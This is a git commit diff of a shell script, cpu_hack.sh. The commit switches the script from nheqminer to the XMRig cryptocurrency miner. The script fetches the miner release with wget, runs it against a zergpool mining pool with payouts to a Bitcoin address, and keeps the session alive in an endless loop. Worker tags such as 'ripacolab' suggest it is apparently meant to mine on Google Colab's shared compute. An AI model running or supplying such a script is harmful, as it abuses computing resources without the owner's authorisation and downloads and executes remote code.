0eff8876777c0ecb615c72ef77acaafd7dfcfb13
justideas2013 <90269029+justideas2013@users.noreply.github.com>
2021-09-12 00:23:09 -0300

    Update cpu_hack.sh

--- cpu_hack.sh
+++ cpu_hack.sh
@@ -1,11 +1,10 @@
 #!/bin/sh
 sudo apt update
 sudo apt install screen -y
-wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
-tar xf nheqminer-Linux-v0.8.2.tgz
-tar xf nheqminer-Linux-v0.8.2.tar.gz
-cd nheqminer
-./nheqminer -v -l verushash.mine.zergpool.com:3300 -u 1NFd7YKLwgFte8hF3k7HXykXh6Wdvx7aUU.git -p c=BTC,mc=VRSC,ID=colab -t 4
+wget https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz
+tar xf xmrig-6.14.0-linux-x64.tar.gz
+cd xmrig-6.14.0
+./xmrig -o stratum+tcp://randomx.mine.zergpool.com:4453 -a rx/0 -k -u 1NFd7YKLwgFte8hF3k7HXykXh6Wdvx7aUU -p c=BTC,mc=XMR,ID=ripacolab --cpu 4
 while [ 1 ]; do
 sleep 3
 done
